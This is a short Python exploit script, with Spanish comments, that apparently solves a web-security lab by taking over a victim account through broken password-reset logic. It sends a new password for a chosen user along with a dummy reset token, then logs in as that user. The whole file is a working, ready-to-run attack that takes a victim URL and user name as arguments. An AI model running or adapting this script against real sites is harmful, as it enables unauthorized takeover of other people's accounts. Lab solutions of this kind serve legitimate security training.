#!/usr/bin/env python3 

import requests
import sys
import signal
import urllib3
import argparse
import time
import signal
import pdb
from termcolor import colored
from pwn import *

# Ctrl + c 

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...")

signal.signal(signal.SIGINT, def_handler)

# HTTPS problem
urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def get_arguments():

    parser = argparse.ArgumentParser(description='Password reset broken logic')
    parser.add_argument("-t", "--target", dest="target", required=True, help='Victim url (Ex: -t https://www.example.com)')
    parser.add_argument("-u", "--user", dest="user", required=True, help='Victim user')

    options = parser.parse_args()

    return options.target, options.user

def password_reset_attack(s, target, user):

    p1 = log.progress("Iniciando ataque: account takeover through reset passwod")
    new_password = input(colored(f"[+] Ingrese la nueva password que quiere para {user}: ", "green"))

    # Reset password's user victim

    print(colored(f"[!] Reseteando password de {user}...", "green"))
    password_reset_url = target + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {
        'temp-forgot-password-token': 'x',
        'username': user, 
        'new-password-1': new_password,
        'new-password-2': new_password
    }

    r = s.post(password_reset_url, data=password_reset_data, verify=False, proxies=proxies)

    p2 = log.progress(f"Password reset successfully")

    return user, new_password

def login_user_victim(s, target, user, new_password):

    print(colored(f"Loggin into victim user with the new password", "green"))
    login_url = target + "/login"
    post_data = {
        'username': user,
        'password': new_password
    }

    r = s.post(login_url, data=post_data, verify=False, proxies=proxies)
    
    if "Log out" in r.text:
        p3 = log.progress("Laboratory completed successfully!")

    else:
        print(colored(f"Exploit failed.", "red"))
        sys.exit(1)

def main():

    target, user = get_arguments()
    s = requests.session()
    s.verify = False
    user, new_password = password_reset_attack(s, target, user)
    login_user_victim(s, target, user, new_password)    
    

if __name__ == '__main__':
    main()
